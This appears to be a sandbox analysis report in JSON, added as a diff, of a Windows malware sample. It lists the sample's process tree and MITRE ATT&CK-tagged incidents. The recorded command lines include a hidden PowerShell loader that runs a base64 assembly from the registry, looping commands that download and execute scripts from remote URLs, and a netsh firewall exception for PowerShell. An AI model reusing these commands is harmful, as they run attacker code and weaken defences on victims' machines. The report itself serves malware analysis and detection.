@@ -1,0 +1,178 @@
+{
+ "Name": "4dd708ff7ae1a68f29f8c6f64a5729f49199e1158b10d9c027d3fc75ced67038",
+ "Md5": "cf31f89ed473d44d45e6a6a16e5ff1b5",
+ "UUID": "2acb02d1-c876-4c8e-85ba-4dc6ac26c282",
+ "Processes": [
+  {
+   "OID": "5cd8f687d19d8a760f8db501",
+   "ProcessID": 3096,
+   "ParentPID": 252,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\4dd708ff7ae1a68f29f8c6f64a5729f49199e1158b10d9c027d3fc75ced67038.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\4dd708ff7ae1a68f29f8c6f64a5729f49199e1158b10d9c027d3fc75ced67038.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1557722759092
+  },
+  {
+   "OID": "5cd8f6bbd19d8a760f8dc7f4",
+   "ProcessID": 2440,
+   "ParentPID": 252,
+   "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -ExecutionPolicy Bypass -w hidden -noexit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software).Vx)).EntryPoint.Invoke($Null,$Null)",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "ProcessType": "Probably manual launch or APC inject",
+   "CreationTimestamp": 1557722811357
+  },
+  {
+   "OID": "5cd8f6bcd19d8a760f8dc805",
+   "ProcessID": 3032,
+   "ParentPID": 2440,
+   "CommandLine": "powershell  -ExecutionPolicy Bypass -w hidden -noexit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software).Vx)).EntryPoint.Invoke($Null,$Null)",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1557722811467
+  },
+  {
+   "OID": "5cd8f6d0d19d8a760f8df5a1",
+   "ProcessID": 3000,
+   "ParentPID": 252,
+   "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -EP b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('https://glot.io/snippets/ezfhibwlko/raw/main.c'))}catch{}Start-Sleep 200}",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "ProcessType": "Probably manual launch or APC inject",
+   "CreationTimestamp": 1557722832342
+  },
+  {
+   "OID": "5cd8f6d0d19d8a760f8df5a3",
+   "ProcessID": 3688,
+   "ParentPID": 3000,
+   "CommandLine": "powershell  -EP b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('https://glot.io/snippets/ezfhibwlko/raw/main.c'))}catch{}Start-Sleep 200}",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1557722832451
+  },
+  {
+   "OID": "5cd8f6d1d19d8a760f8dfddc",
+   "ProcessID": 2744,
+   "ParentPID": 3688,
+   "CommandLine": "netsh firewall add allowedprogram \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"powershell.exe\" ENABLE",
+   "Image": "C:\\Windows\\system32\\netsh.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1557722833420
+  },
+  {
+   "OID": "5cd8f6d8d19d8a760f8e09b8",
+   "ProcessID": 3340,
+   "ParentPID": 252,
+   "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -EP b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('http://murtad.droppages.com/1.txt'))}catch{}Start-Sleep 200}",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "ProcessType": "Probably manual launch or APC inject",
+   "CreationTimestamp": 1557722840514
+  },
+  {
+   "OID": "5cd8f6d8d19d8a760f8e09ba",
+   "ProcessID": 4024,
+   "ParentPID": 3340,
+   "CommandLine": "powershell  -EP b -w hidden -noexit -C for(;;){try{IEX((new-object net.webclient).downloadstring('http://murtad.droppages.com/1.txt'))}catch{}Start-Sleep 200}",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1557722840607
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5cd8f687d19d8a760f8db4f4",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6bcd19d8a760f8dc805",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6d8d19d8a760f8e09ba",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6d8d19d8a760f8e09b8",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1086",
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f6d0d19d8a760f8df5a3",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6d0d19d8a760f8df5a3",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6d0d19d8a760f8df5a3",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f6d0d19d8a760f8df5a3",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6d0d19d8a760f8df5a1",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1086",
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f6bcd19d8a760f8dc805",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f6bbd19d8a760f8dc7f4",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1086",
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f687d19d8a760f8db4f8",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f687d19d8a760f8db4e7",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5cd8f687d19d8a760f8db501",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f687d19d8a760f8db501",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5cd8f687d19d8a760f8db501",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  }
+ ]
+}
